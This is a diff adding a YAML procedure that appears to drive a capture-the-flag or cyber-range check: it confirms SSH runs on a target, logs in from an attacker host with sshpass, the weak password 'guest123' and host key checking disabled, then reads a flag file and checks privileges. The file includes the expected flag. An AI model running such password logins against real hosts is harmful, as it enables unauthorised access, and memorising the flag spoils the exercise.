@@ -1,0 +1,41 @@
+procedure:
+- action:
+    command: ss -tlnp | grep ':22'
+    type: exec_target
+  expect:
+    stdout_contains: :22
+  outputs: {}
+  session: null
+  step_id: verify_ssh_running
+  timeout: 10
+- action:
+    command: sshpass -p 'guest123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      guest@${target_host} 'id && cat /home/guest/flag.txt'
+    type: exec_attacker
+  expect:
+    stdout_contains: uid=1000(guest)
+  outputs: {}
+  session: null
+  step_id: attempt_ssh_login
+  timeout: 30
+- action:
+    command: sshpass -p 'guest123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      guest@${target_host} 'cat /home/guest/flag.txt'
+    type: exec_attacker
+  expect:
+    stdout_contains: FLAG{weak_credentials_ssh_compromised}
+  outputs: {}
+  session: null
+  step_id: verify_flag
+  timeout: 30
+- action:
+    command: sshpass -p 'guest123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      guest@${target_host} 'id && groups'
+    type: exec_attacker
+  expect:
+    stdout_contains: gid=1000(guest) groups=1000(guest)
+  outputs: {}
+  session: null
+  step_id: verify_no_sudo
+  timeout: 30
+sessions: []
